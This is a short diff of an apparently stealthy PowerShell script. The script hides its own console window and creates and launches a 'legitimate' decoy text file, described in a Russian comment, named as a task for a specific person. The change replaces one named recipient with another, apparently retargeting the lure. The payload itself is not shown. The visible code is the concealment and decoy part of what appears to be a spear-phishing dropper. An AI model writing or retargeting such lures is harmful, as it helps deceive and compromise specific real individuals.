@@ -9,7 +9,7 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
 # СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
-$fileName = "Задание_для_Мясникова_Д._А.txt"
+$fileName = "Задание_для_Каина_А._В.txt"
 $filePath = Join-Path $env:LOCALAPPDATA $fileName
 
 $content = @"
@@ -92,3 +92,4 @@ catch {
 
 
 exit
+
